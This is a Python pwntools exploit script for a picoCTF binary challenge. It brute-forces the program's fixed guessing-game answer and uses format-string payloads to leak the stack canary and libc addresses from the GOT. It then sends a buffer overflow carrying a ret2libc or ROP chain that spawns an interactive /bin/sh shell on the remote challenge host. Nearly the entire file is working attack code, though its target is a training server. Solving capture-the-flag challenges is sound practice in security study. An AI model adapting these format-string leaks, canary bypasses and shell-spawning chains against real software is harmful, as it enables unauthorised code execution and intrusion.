#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")
libc = ELF("./libc6-i386_2.27-3ubuntu1.6_amd64.so")		# REMOTE
# libc = ELF("./libc6_2.37-0ubuntu2_i386.so")			# LOCAL
context.binary = exe

# Function "get_random" returns a pointer; the program uses that pointer to calculate random numbers
# so it sticks with the same generated number since the pointer is fixed (the range is [-4095:4096])
ANSWER = b'-3727'	# REMOTE
# ANSWER = b'-3711'	# LOCAL


def conn():
	global r

	if args.LOCAL:
		r = process([exe.path])
		if args.PLT_DEBUG:
			gdb.attach(r)
	else:
		r = remote("jupiter.challenges.picoctf.org", 44628)

	return r


'''
# Used to bruteforce the answer
def bruteforce_answer():
	# Function "get_random" returns a pointer; the program uses that pointer to calculate random numbers
	# so it sticks with the same generated number since the pointer is fixed (the range is [-4095:4096])
	answers = list(range(-4095, 4096))

	i = 0
	for a in answers:
		r.sendlineafter(b'What number would you like to guess?\n', bytes(str(a), 'utf-8'))
		resp = r.recvlineS(1)
		print(i, resp)
		i += 1

		if 'Congrats!' in resp:
			return bytes(str(a), 'utf-8')

	return None
'''


def leak_canary():
	r.sendlineafter(b'What number would you like to guess?\n', ANSWER)

	payload = b'%135$lx'    # Canary position (as printf argument position) in the stack
	r.sendlineafter(b'Name? ', payload)
	canary = r.recvlineS().strip().strip('Congrats: ')

	log.info(f'Leaked canary: {canary}')
	return bytes(reversed(bytes.fromhex(canary)))		# Return it in little endian


def leak_libc():
	printf_got = exe.got['printf']
	fgets_got  = exe.got['fgets']
	atol_got   = exe.got['atol']

	r.sendlineafter(b'What number would you like to guess?\n', ANSWER)

	payload =  p32(printf_got) + p32(fgets_got) + p32(atol_got)
	payload += b'-%7$s-%8$s-%9$s'
	r.sendlineafter(b'Name? ', payload)
	
	leaks = r.recvline().strip().strip(b'Congrats: ').split(b'-')[1:]
	leaks = [bytes(reversed(l[:4])) for l in leaks]      # Reverse the address and remove other addresses since it doesn't stop on a NULL byte

	log.info(f'Leaked addresses: {[l.hex() for l in leaks]}')
	libc.address = int.from_bytes(leaks[0], "big") - libc.symbols['printf']
	log.info(f'LIBC base address: {hex(libc.address)}')


def spawn_shell_with_ROP(canary: bytes):
	bin_sh      = next(libc.search(b'/bin/sh'))
	pop_ebx     = ROP(exe).find_gadget(['pop ebx', 'ret'])[0]
	pop_eax     = ROP(libc).find_gadget(['pop eax', 'ret'])[0]
	pop_ecx_edx = ROP(libc).find_gadget(['pop ecx', 'pop edx', 'ret'])[0]		# Couldn't find it splitted but it's still good
	int_80		= ROP(libc).find_gadget(['int 0x80'])[0]

	r.sendlineafter(b'What number would you like to guess?\n', ANSWER)

	payload =  b'A' * 512 + canary + b'B' * 12 		# Rewrite the canary so it won't detect the BOF
	payload += p32(pop_ebx) + p32(bin_sh) + p32(pop_ecx_edx) + p32(0) + p32(0) + p32(pop_eax) + p32(11) + p32(int_80)

	r.sendlineafter(b'Name? ', payload)
	r.interactive()


def spawn_shell_with_system(canary: bytes):
	system 	= libc.symbols['system']
	exit	= libc.symbols['exit']
	bin_sh	= next(libc.search(b'/bin/sh'))

	r.sendlineafter(b'What number would you like to guess?\n', ANSWER)

	# https://security.stackexchange.com/questions/241332/understanding-ret2libc-return-address-location
	payload =  b'A' * 512 + canary + b'B' * 12 		# Rewrite the canary so it won't detect the BOF
	payload += p32(system) + p32(exit) + p32(bin_sh)

	r.sendlineafter(b'Name? ', payload)
	r.interactive()


def main():
	r = conn()
	
	# bruteforce_answer()
	leak_libc()
	canary = leak_canary()
	# spawn_shell_with_ROP(canary)
	spawn_shell_with_system(canary)


if __name__ == "__main__":
	main()
